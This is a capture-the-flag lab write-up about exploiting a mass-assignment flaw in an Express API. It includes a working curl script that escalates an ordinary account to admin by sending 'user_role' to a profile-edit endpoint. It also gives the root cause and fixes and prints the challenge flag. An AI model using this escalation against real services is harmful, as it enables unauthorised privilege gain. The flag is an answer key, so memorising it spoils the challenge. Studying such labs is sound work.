# Herra — Mass Assignment via Profile Update (API Vulnerabilities)

**Target:** https://tvoyxpr7wt.voorivex-lab.online/
**Objective:** Retrieve flag as admin
**Category:** API Security / API Enumeration and Exploitation

## Observation

- Root `/` returns `Cannot GET /` (Express, API-only surface)
- `GET /api/user/me` → 401
- `GET /api/admin/flag` → 401
- Wordlist fuzz (raft-small, first 500) hit **`/docs`** → Swagger UI
- OpenAPI spec embedded in `/docs/swagger-ui-init.js` (`swaggerDoc` object)
- Swagger title: "Hera Challenge"; auth is **JWT Bearer**, not cookies

## Hypothesis

Signup may be hardened, but `PUT /api/user/edit` binds extra JSON fields. Injecting `user_role: admin` after normal registration should escalate privileges.

## Evidence

Register response (normal, no role injection):

```json
{"message":"User registered successfully","user":{"id":1,"username":"herra1783725190","firstname":"Test","lastname":"User",...}}
```

Login returns JWT:

```json
{"token":"eyJ..."}
```

`GET /api/user/me` before escalation:

```json
{"user":{"id":1,"username":"herra1783725190","firstname":"Test","lastname":"User","user_role":"user"}}
```

Swagger documents only `firstname`/`lastname` on edit — omits `user_role`.

## Test

```bash
BASE="https://tvoyxpr7wt.voorivex-lab.online"
USER="herra$(date +%s)"
PASS="Password123!"

curl -s -X POST "$BASE/api/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\",\"firstname\":\"Test\",\"lastname\":\"User\"}"

TOKEN=$(curl -s -X POST "$BASE/api/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" | jq -r .token)

curl -s "$BASE/api/user/me" -H "Authorization: Bearer $TOKEN"

curl -s -X PUT "$BASE/api/user/edit" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_role":"admin"}'

curl -s "$BASE/api/user/me" -H "Authorization: Bearer $TOKEN"
curl -s "$BASE/api/admin/flag" -H "Authorization: Bearer $TOKEN"
```

## Result

- **Confirmed:** Mass assignment via `user_role` on `PUT /api/user/edit`
- `GET /api/admin/flag` returns flag after escalation
- Signup-time injection not required; update endpoint is the sink
- Flag extracted (not submitted per instructions)

## Root cause

Profile update handler performs unrestricted object binding. Swagger allowlists `firstname`/`lastname` in documentation only; server accepts and persists `user_role`.

## Fix

- Allowlist writable fields on `PUT /api/user/edit`
- Never accept `user_role` from client; assign server-side
- Enforce admin checks on `/api/admin/flag` from trusted DB state

## Flag

`flag_d57ecbd4e0150359edd2506c84103b7d`
